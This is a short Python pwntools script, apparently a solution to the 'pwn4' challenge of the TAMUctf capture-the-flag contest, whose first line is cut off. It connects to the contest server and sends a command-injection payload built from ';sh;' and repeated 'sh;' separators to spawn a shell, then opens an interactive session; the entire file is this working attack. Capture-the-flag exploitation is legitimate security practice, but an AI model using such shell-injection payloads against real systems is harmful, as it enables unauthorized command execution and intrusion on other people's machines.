
m pwn import *


#r = process("./pwn4")
r = remote("pwn.tamuctf.com",4325)
pause()
r.recv()
payload = ""
payload += ";sh;"*1
payload += "sh;"*8
payload += "BBBB"
r.sendline(payload)
r.interactive()
